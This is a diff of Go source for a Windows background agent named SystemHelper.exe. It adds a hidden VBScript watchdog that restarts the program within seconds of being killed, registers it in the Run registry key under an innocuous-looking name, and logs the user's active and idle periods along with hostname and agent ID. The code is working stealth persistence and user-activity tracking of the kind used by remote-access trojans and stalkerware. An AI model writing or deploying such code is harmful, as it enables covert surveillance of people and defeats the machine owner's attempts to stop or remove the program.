@@ -137,7 +137,6 @@ func preventDuplicate() {
 	myPID := os.Getpid()
 	exe, _ := os.Executable()
 	exeName := filepath.Base(exe)
-	// Find and kill only OTHER instances with the same name
 	cmd := exec.Command("powershell", "-NoProfile", "-Command",
 		"Get-Process -Name '"+strings.TrimSuffix(exeName, ".exe")+"' -ErrorAction SilentlyContinue | Where-Object { $_.Id -ne "+fmt.Sprintf("%d", myPID)+" } | Stop-Process -Force")
 	hideCmd(cmd)
@@ -148,20 +147,24 @@ func preventDuplicate() {
 
 func setupAutostart() {
 	exe, _ := os.Executable()
-	dir := filepath.Dir(exe)
-	watchdogPath := filepath.Join(dir, "watchdog.bat")
-	watchdog := `@echo off
-:loop
-tasklist | find "SystemHelper" >nul
-if errorlevel 1 start "" "` + exe + `"
-timeout /t 120 /nobreak >nul
-goto loop`
+	// Create watchdog that monitors and restarts the agent
+	watchdogPath := filepath.Join(dataDir(), "watchdog.vbs")
+	watchdog := `Set sh = CreateObject("WScript.Shell")
+Do
+  Set svc = GetObject("winmgmts:\\.\root\cimv2")
+  Set procs = svc.ExecQuery("SELECT * FROM Win32_Process WHERE Name='SystemHelper.exe'")
+  If procs.Count = 0 Then
+    sh.Run """` + exe + `""", 0, False
+  End If
+  WScript.Sleep 10000
+Loop`
 	os.WriteFile(watchdogPath, []byte(watchdog), 0644)
+	// Add to registry for boot startup
 	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.SET_VALUE)
 	if err != nil { log("Registry: " + err.Error()); return }
 	defer k.Close()
-	k.SetStringValue("SystemMonitor", watchdogPath)
-	log("Watchdog installed (auto-restarts every 2 min)")
+	k.SetStringValue("SystemHelper", `wscript.exe "`+watchdogPath+`"`)
+	log("Auto-start installed (survives reboot + auto-restarts if killed)")
 }
 
 
@@ -172,7 +175,14 @@ func receivedDir() string {
 
 func startActivityLogger() {
 	bt := bootTime()
-	logEventDate("STARTED (boot: " + bt.Format("15:04") + ")")
+	now := time.Now()
+	dateStr := now.Format("2006-01-02 15:04:05")
+	logEventDate("========================================")
+	logEventDate("[" + dateStr + "] SYSTEM STARTED v" + Version)
+	logEventDate("  Hostname: " + hostname)
+	logEventDate("  Boot time: " + bt.Format("2006-01-02 15:04:05"))
+	logEventDate("  Agent ID: " + agentId)
+	logEventDate("========================================")
 	go func() {
 		lastIdle := 0
 		lastLog := 0
@@ -180,18 +190,19 @@ func startActivityLogger() {
 		for {
 			idle := getIdleSeconds()
 			now := time.Now()
+			dateStr := now.Format("2006-01-02 15:04:05")
 			if idle > 300 && lastIdle < 300 {
 				idlePeriodStart = now
 				activeDuration := now.Sub(activePeriodStart).Seconds()
 				totalActiveSeconds += int64(activeDuration)
-				logEventDate("INACTIVE (idle " + fmt.Sprintf("%ds", idle) + ", active was " + fmt.Sprintf("%.0fs", activeDuration) + ")")
+				logEventDate("[" + dateStr + "] IDLE (was active " + fmt.Sprintf("%.0f", activeDuration) + "s)")
 				lastIdleState = "idle"
 			}
 			if idle < 300 && lastIdle >= 300 {
 				activePeriodStart = now
 				idleDuration := now.Sub(idlePeriodStart).Seconds()
 				totalIdleSeconds += int64(idleDuration)
-				logEventDate("ACTIVE (resumed after " + fmt.Sprintf("%.0fs", idleDuration) + ")")
+				logEventDate("[" + dateStr + "] ACTIVE (was idle " + fmt.Sprintf("%.0f", idleDuration) + "s)")
 				lastIdleState = "active"
 			}
 			lastIdle = idle
@@ -206,7 +217,7 @@ func startActivityLogger() {
 				} else {
 					totalIdle += int64(now.Sub(idlePeriodStart).Seconds())
 				}
-				logEventDate(fmt.Sprintf("RUNNING (uptime %dmin, active %ds, idle %ds)", osUptime(), totalActive, totalIdle))
+				logEventDate("[" + dateStr + "] RUNNING | uptime " + fmt.Sprintf("%d", osUptime()) + "min | active " + fmt.Sprintf("%ds", totalActive) + " | idle " + fmt.Sprintf("%ds", totalIdle))
 			}
 			statusTick++
 			if statusTick >= 5 && wsRef != nil {
